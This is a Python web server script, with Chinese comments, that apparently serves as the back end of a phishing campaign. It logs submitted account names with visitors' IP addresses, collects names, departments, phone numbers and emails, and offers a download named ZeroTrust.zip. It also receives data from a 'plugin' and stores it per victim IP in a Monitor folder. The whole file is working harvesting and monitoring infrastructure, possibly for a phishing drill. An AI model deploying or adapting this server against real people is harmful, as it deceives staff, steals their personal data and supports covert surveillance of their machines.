from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import time
import json
import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
MONITOR_DIR = os.path.join(BASE_DIR, 'Monitor')

if not os.path.exists(MONITOR_DIR):
    os.makedirs(MONITOR_DIR)

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.serve_file('index.html', 'text/html')
        elif self.path == '/success':
            self.serve_file('success.html', 'text/html')
        elif self.path == '/info':
            self.serve_file('info.html', 'text/html')
        elif self.path == '/final_success':
            self.serve_file('final_success.html', 'text/html')
        elif self.path == '/ZeroTrust.zip':
            self.serve_file('ZeroTrust.zip', 'application/zip', as_attachment=True)
        elif self.path == '/oiiaioooooiai.gif':  # 处理 GIF 请求
            self.serve_file('oiiaioooooiai.gif', 'image/gif')
        elif self.path == '/skull.gif':  # 处理 GIF 请求
            self.serve_file('skull.gif', 'image/gif')
        else:
            self.send_error(404)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        try:
            raw_data = self.rfile.read(content_length).decode('utf-8')

            if self.path == '/':
                post_data = parse_qs(raw_data)
                with open('login_records.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{self.client_address[0]}, {post_data.get('account', [''])[0]}, {time.ctime()}\n")
                self.send_redirect('/info')

            elif self.path == '/info':
                post_data = parse_qs(raw_data)
                with open('user_profiles.txt', 'a', encoding='utf-8') as f:
                    f.write(f"""
用户IP: {self.client_address[0]}
登录时间: {time.ctime()}
姓名: {post_data.get('name', [''])[0]}
部门: {post_data.get('department', [''])[0]}
手机号: {post_data.get('phone', [''])[0]}
邮箱: {post_data.get('email', [''])[0]}
----------------------------
                    """)
                self.send_redirect('/final_success')

            elif self.path == '/log':
                plugin_data = json.loads(raw_data)
                client_ip = self.client_address[0]
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                print("Received data:", plugin_data)  # 调试打印
                file_path = os.path.join(MONITOR_DIR, f"{client_ip}.txt")
                with open(file_path, 'a', encoding='utf-8') as f:
                    f.write(f"[{timestamp}] {plugin_data.get('data', '')}\n")

                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))

        except json.JSONDecodeError:
            self.send_error(400, "Invalid JSON data")
        except Exception as e:
            self.send_error(500, f"Server error: {str(e)}")

    def serve_file(self, filename, content_type, as_attachment=False):
        """通用文件服务方法"""
        try:
            with open(filename, 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', content_type)
                if as_attachment:
                    self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_error(404)

    def send_redirect(self, location):
        """重定向方法"""
        self.send_response(302)
        self.send_header('Location', location)
        self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), Handler)
    print("服务器已启动，访问地址：http://localhost:8000")
    server.serve_forever()
